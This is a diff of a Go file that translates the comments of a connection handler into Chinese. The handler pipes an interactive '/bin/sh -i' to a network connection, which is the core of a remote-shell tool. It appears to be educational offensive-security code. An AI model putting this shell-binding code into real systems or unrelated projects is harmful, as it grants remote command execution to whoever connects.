@@ -10,14 +10,13 @@ import (
 func handle(conn net.Conn) {
 
 	/*
-	 * Explicitly calling /bin/sh and using -i for interactive mode
-	 * so that we can use it for stdin and stdout.
-	 * For Windows use exec.Command("cmd.exe")
+	 * 显式调用/bin/sh并使用-i进入交互模式,
+	 * 以便我们可以将其用于stdin和stdout。
+	 * Windows上使用exec.Command("cmd.exe")
 	 */
-	// cmd := exec.Command("cmd.exe")
 	cmd := exec.Command("/bin/sh", "-i")
 	rp, wp := io.Pipe()
-	// Set stdin to our connection
+	// 将stdin设置为我们到连接
 	cmd.Stdin = conn
 	cmd.Stdout = wp
 	go io.Copy(conn, rp)
